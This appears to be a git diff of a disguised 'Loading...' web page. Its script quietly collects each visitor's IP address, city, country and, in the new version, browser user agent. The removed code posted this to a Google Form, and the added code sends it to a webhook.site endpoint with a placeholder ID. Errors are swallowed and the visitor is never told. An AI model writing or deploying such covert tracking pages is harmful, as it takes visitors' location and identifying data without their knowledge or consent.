@@ -1,16 +1,8 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <title>Loading...</title>
-    <style>
-        body {
-            background: black;
-            margin: 0;
-            cursor: none;
-            overflow: hidden;
-        }
-    </style>
+<meta charset="UTF-8">
+<title>Loading...</title>
 </head>
 <body>
 
@@ -30,15 +22,20 @@ async function collect() {
             country = d.country_name || country;
         } catch (e) {}
 
-        const loc = `${ip}, ${city}, ${country}`;
-        const data = encodeURIComponent(loc);
+        const data = {
+            ip: ip,
+            city: city,
+            country: country,
+            userAgent: navigator.userAgent
+        };
 
-        const formId = "1e1Fiz9SDYSiDW35x0_oex2tsKBTGVwvkYF_aubzYOuw"; // твой
-        const entry = "entry.295293350"; // ПРОВЕРЬ!
-
-        const url = `https://docs.google.com/forms/d/e/${formId}/formResponse?${entry}=${data}`;
-
-        fetch(url, { method: "POST", mode: "no-cors" });
+        await fetch("https://webhook.site/ТВОЙ_ID", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(data)
+        });
 
     } catch (e) {}
 }
